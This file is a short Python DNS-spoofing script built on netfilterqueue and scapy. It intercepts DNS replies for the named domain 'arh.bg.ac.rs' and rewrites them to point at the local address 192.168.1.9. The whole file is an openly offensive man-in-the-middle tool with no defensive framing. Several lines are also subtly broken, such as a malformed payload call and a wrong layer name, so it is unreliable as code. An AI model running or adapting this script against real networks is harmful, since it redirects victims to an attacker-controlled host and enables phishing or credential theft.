#!/usr/bin/python
# WILL NOT WORK WITH WEBSITES WITH TLS ENCRYPTION

import netfilterqueue
import scapy.all as scapy
import iptables

def del_fields(scapy_packet):
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum    
    del scapy_packet[scapy.UDP].len
    del scapy_packet[scapy.UDP].chksum
    return scapy_packet
    
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get.payload())
    print(scapy_packet)
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSRQ].qname
        if "arh.bg.ac.rs" in qname:
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.9")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            scapy_packet = del_fields(scapy_packet)
            scapy_packet.set_payload(str(scapy_packet))
    packet.accept()        
    
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()